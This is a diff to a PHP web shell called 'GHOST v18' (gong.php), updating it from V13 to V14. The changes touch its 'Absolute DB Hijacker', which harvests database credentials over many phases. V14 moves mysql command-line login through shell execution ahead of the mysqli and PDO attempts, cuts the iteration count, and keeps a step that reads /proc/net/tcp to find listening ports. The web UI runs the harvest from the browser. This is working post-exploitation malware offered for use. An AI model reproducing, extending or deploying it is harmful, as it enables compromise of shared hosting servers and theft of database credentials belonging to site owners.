@@ -1,8 +1,8 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - V13: The Absolute.
+// GHOST v18 - V14: DB CLI Bypass, Scanner Filter.
 
-define('GH_VER',      '18.0.0-v13');
+define('GH_VER',      '18.0.0-v14');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');
@@ -338,20 +338,11 @@ function gh_scan_batch($root, $offset = 0, $limit = 50) {
     return $res;
 }
 
-// ==== SECTION 4: THE ABSOLUTE DB HIJACKER (V13) =============================
+// ==== SECTION 4: THE ABSOLUTE DB HIJACKER (V14) =============================
 function gh_db_connect($host, $user, $pass, $socket = null) {
     $host = trim($host); $user = trim($user); $pass = trim($pass);
     
-    if (gh_can('mysqli_connect')) {
-        try { 
-            if ($socket) $conn = @mysqli_connect(null, $user, $pass, '', null, $socket);
-            else $conn = @mysqli_connect($host, $user, $pass); 
-            if ($conn) return $conn; 
-        } catch (Throwable $e) {}
-    }
-    if (gh_can('pdo_drivers') && in_array('mysql', @pdo_drivers())) {
-        try { $dsn = "mysql:"; if ($socket) $dsn .= "unix_socket=$socket;"; else $dsn .= "host=$host;"; $pdo = new PDO($dsn, $user, $pass, array(PDO::ATTR_TIMEOUT => 3)); if ($pdo) return $pdo; } catch (Throwable $e) {}
-    }
+    // PRIORITAS 1: CLI (Paling Ampuh di Shared Hosting)
     if (gh_can_exec()) {
         $cmd = 'mysql ' . ($socket ? '-S ' . @escapeshellarg($socket) : '-h ' . @escapeshellarg($host)) . ' -u ' . @escapeshellarg($user) . ' -p' . @escapeshellarg($pass) . ' -e "SHOW DATABASES" 2>&1';
         $res = gh_exec_adv($cmd);
@@ -359,6 +350,21 @@ function gh_db_connect($host, $user, $pass, $socket = null) {
             return 'CLI';
         }
     }
+    
+    // PRIORITAS 2: MySQLi
+    if (gh_can('mysqli_connect')) {
+        try { 
+            if ($socket) $conn = @mysqli_connect(null, $user, $pass, '', null, $socket);
+            else $conn = @mysqli_connect($host, $user, $pass); 
+            if ($conn) return $conn; 
+        } catch (Throwable $e) {}
+    }
+    
+    // PRIORITAS 3: PDO
+    if (gh_can('pdo_drivers') && in_array('mysql', @pdo_drivers())) {
+        try { $dsn = "mysql:"; if ($socket) $dsn .= "unix_socket=$socket;"; else $dsn .= "host=$host;"; $pdo = new PDO($dsn, $user, $pass, array(PDO::ATTR_TIMEOUT => 3)); if ($pdo) return $pdo; } catch (Throwable $e) {}
+    }
+    
     return false;
 }
 
@@ -366,7 +372,7 @@ function gh_db_harvest() {
     $logs = array(); $info = array();
     $found_pass = false;
     $db_host = 'localhost'; $db_user = ''; $db_pass = ''; $db_socket = null;
-    $max_iterations = 10;
+    $max_iterations = 5;
 
     for ($iter = 1; $iter <= $max_iterations; $iter++) {
         if ($found_pass) break;
@@ -753,7 +759,6 @@ function gh_db_harvest() {
             $logs[] = "[*] Phase 33: /proc/net/tcp Dump...";
             $net = gh_read('/proc/net/tcp');
             if ($net) {
-                // Cari port yang listen (0A = LISTEN)
                 if (preg_match('/:\s*([0-9A-F]{4})\s+[0-9A-F]{8}:[0-9A-F]{4}\s+0A/i', $net, $m)) {
                     $port = hexdec($m[1]);
                     $logs[] = "[+] Port LISTEN ditemukan: $port";
@@ -1120,7 +1125,7 @@ function gh_router() {
     }
 }
 
-// ==== UI (TAB NAVIGATION - V13) =============================================
+// ==== UI (TAB NAVIGATION - V14) =============================================
 function gh_ui() {
     while (ob_get_level() > 0) { @ob_end_clean(); }
     if (!headers_sent()) { @header('Content-Type: text/html; charset=utf-8'); @header('X-Powered-By: '); }
@@ -1392,7 +1397,7 @@ async function delFileScan(enc) {
 }
 
 async function dbHarvest() {
-    const o = document.getElementById('db-out'); o.innerText = 'Running The Absolute DB Hijacker (40 Phases x 10 Iterations)... Please wait, ini bisa memakan waktu.';
+    const o = document.getElementById('db-out'); o.innerText = 'Running The Absolute DB Hijacker (40 Phases x 5 Iterations)... Please wait, ini bisa memakan waktu.';
     const d = await api('db_harvest');
     if (d.err) return o.innerText = d.err;
     o.innerText = d.logs.join('\n');
